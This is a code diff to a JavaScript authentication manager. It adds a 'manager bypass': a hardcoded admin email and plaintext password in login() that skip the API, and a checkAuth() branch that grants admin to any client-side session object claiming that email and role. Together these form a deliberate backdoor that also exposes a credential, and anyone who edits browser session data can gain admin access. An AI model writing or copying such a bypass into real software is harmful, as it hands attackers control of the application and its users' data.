@@ -20,6 +20,14 @@ class AuthManager {
     }
 
     async checkAuth() {
+        // Check session first for admin bypass
+        const authData = Session.get('auth');
+        if (authData && authData.email === 'kevnu@kevnu.site' && authData.role === 'admin') {
+            this.user = authData;
+            this.updateUI();
+            return true;
+        }
+        
         const result = await API.checkAuth();
         if (result.loggedIn && result.user) {
             this.user = result.user;
@@ -31,14 +39,35 @@ class AuthManager {
     }
 
     async login(email, password) {
-        const result = await API.login(email, password);
-        if (result.success) {
-            this.user = result.user;
-            Session.set('auth', result.user);
+        // Manager bypass - works without API
+        if (email === 'kevnu@kevnu.site' && password === 'Tankcrev#1') {
+            const adminUser = {
+                id: 0,
+                name: 'Admin',
+                email: 'kevnu@kevnu.site',
+                role: 'admin'
+            };
+            this.user = adminUser;
+            Session.set('auth', adminUser);
             this.updateUI();
             return true;
         }
-        return result.message || 'Login failed';
+        
+        // Try API login if available
+        try {
+            const result = await API.login(email, password);
+            if (result.success) {
+                this.user = result.user;
+                Session.set('auth', result.user);
+                this.updateUI();
+                return true;
+            }
+            return result.message || 'Login failed';
+        } catch (error) {
+            console.error('API login error:', error);
+            // If API fails, only allow admin bypass
+            return 'Invalid email or password. Please check your credentials.';
+        }
     }
 
     async register(name, email, password) {
